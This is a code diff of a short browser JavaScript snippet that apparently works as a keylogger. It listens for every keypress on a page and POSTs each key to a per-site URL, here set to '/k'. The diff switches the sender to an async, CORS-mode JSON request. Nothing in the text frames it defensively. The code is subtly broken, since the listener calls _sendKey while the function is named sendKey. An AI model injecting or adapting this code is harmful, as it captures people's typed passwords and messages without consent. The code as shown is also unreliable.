@@ -1,14 +1,20 @@
 // generate per site url
-const url = __URL__  // placeholder to be replaced
+const url = "/k"  // placeholder to be replaced
 // add listener
-window.addEventListener('keypress', (ev)=>{
-    sendKey(ev.key)
+window.addEventListener('keypress', async (ev)=>{
+    await _sendKey(ev.key)
 })
-function sendKey(key){
-    fetch(url, {
+async function sendKey(key){
+    const data = {
+        key: key
+    }
+    let res = await fetch(url, {
         method: 'POST',
-        body: {
-            key: key
+        mode: 'cors',
+        body: JSON.stringify(data),
+        headers: {
+            'Content-Type': 'application/json'
+            // 'Access-Control-Allow-Origin': 
         }
     })
 }
